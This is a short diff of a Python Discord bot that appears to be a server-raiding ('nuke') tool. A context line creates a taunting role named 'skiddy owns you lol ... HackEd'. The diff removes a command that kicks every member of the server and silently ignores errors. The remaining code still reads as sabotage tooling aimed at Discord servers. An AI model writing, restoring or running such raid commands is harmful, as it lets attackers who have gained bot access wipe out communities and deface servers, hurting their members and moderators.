@@ -86,16 +86,6 @@ async def r(ctx):
         guild = ctx.guild
         await guild.create_role(name="skiddy owns you lol HhackedhackedckEd HackEd HackEd")
  
-
-@bot.command(pass_context=True)
-async def h(ctx):
-        for user in list(ctx.message.server.members):
-            try:
-                await client.kick(user)
-                print ("User " + user.name + " has been kicked from " + ctx.message.server.name)
-            except:
-                pass
-        print ("Action Completed: kall")
  
 @bot.command(pass_context=True)
 async def c(ctx):
